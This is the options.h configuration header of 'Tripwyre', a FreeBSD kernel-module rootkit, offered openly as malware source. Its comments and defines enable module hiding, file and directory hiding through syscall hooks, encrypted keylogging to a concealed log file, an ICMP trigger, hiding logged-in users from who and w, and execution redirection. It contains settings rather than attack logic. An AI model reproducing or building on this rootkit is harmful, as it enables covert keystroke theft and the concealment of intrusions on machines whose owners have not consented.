/*
 * Tripwyre - A Loadable Kernel Module (LKM) Rootkit for FreeBSD
 * Author: Satish Srinivasan (sathya@freeshell.org)
 *
 * options.h - This file is used for setting various options
 */

/* 
 * Enable debugging support - Set this to "0" to prevent
 * debug messages being printed to the system log.
 * Default value is "1": debugging enabled.
 */
 
#define DEBUG 1

/*
 * Enable module hiding - Set this to "1" to make
 * the module hidden.
 * Default value is "0": module hiding disabled.
 */
 
#define HIDING 0

/*
 * This symbol is used to enable
 * directory hiding support in the 
 * module. Set HIDDEN_DIR symbol above
 * and set this to "1" to enable 
 * the support for directory and file 
 * hiding. The default value is "1".
 * (Enabled) 
 */

#define DIRECTORY_FILE_HIDING 1

/*
 * The Directory hiding module hides this
 * directory from the ls command by hooking
 * getdirentries system call. Change this to 
 * your preferred directory / file.
 */

#define HIDDEN_DIR "hide"

/*
 * The Length of the name of the
 * hidden directory. If you change the
 * above please also update this. 
 */

#define HIDDEN_DIR_LENGTH 4

/*
 * The File Hiding module hides the content
 * of a file from being displayed by "programs"
 * such as cat or vi. This is the start of the
 * filename to be hidden. 
 * 
 * Create files with filenames such as hide_1
 * hide_2 etc., and they will remain HIDDEN.
 */

#define HIDDEN_FILE "hide"

/*
 * If you change the above, change this to
 * reflect the length of the string HIDDEN_FILE
 */

#define HIDDEN_FILE_LENGTH 4

/*
 * This symbol is used to enable KEYLOGGING
 * support in the module. Change this to "1"
 * to enable keylogging support. Default
 * value is "0". WARNING: UNSTABLE.
 */

#define KEYLOGGING 1

/* 
 * The size of the system buffer 
 * for the keylog and for hooking the
 * read/write system call. Leave default 
 * for logging only 256 characters. 
 *
 * Please change the value for larger buffers. 
 * By default there would be no overwriting
 * whatever is in the buffer, if it exceeds 
 * the limit will be IGNORED.
 */

#define MAX_BUF 256

/*
 * This is the path of the file
 * where the keylog is stored
 * If you want it to be hidden,
 * prefix it with a "hide".
 * Also make sure that KEYLOGGING is 
 * set to 1 (enabled) Also see below.
 */

#define LOGPATH "/home/sathya/hide_tripwyre_keylog.log"

/*
 * The Passphrase to be used for
 * encryption of the keylogs.
 *
 * It Should be 16, 24, 32 chars long for
 * good encryption.
 */

#define PASS_PHRASE "mypasswd" 

/*
 * Set the length of the above passphrase here
 */

#define PASSLEN 8

/* 
 * This is the trigger symbol, If the data
 * transmitted or recieved in the ICMP 
 * broadcasts contains or start with this 
 * string. Send an alert to the system log.
 */ 

#define ICMP_TRIGGER "something."

/*
 * This is length of the ICMP trigger
 * If you change the above, please do
 * so to this as well.
 */

#define ICMP_TRIGGER_LENGTH 10

/*
 * This is the symbol to enable ICMP 
 * monitoring. See the above symbol.
 * The default is disabled (0).
 */

#define ICMP_MONITORING 1

/* 
 * Maximum number of hidden users
 * logged in. Change this to increase or 
 * decrease the limit
 */

#define MAXLOGIN 100

/*
 * Signal to hide the presence of a user
 * from who(1). The default value is 378
 */

#define SIGHIDEME 378

/*
 * Enable Hidden user logins, i.e
 * The presence of the user will not be
 * shown by w(1) and who(1). Default value
 * is 0 (Disabled).
 *
 * Please use the controller to specify the
 * login name of the user that you wish to
 * hide.
 *
 * Make sure you have DIRECTORY_FILE_HIDING
 * also enabled to hook chmod system call.
 */

#define HIDDEN_LOGIN 1

/*
 * Perform Execution Redirection
 * Default value: 0 (disabled)
 */

#define EXEC_REDIR 1

/*
 * The Original program whose execution must be
 * redirected
 */

#define ORIGINAL "/home/sathya/bin/original_hello"

/*
 * The replacement program. Prefix with
 * hide to hide it.
 */

#define REPLACEMENT "/home/sathya/bin/replaced_hello"
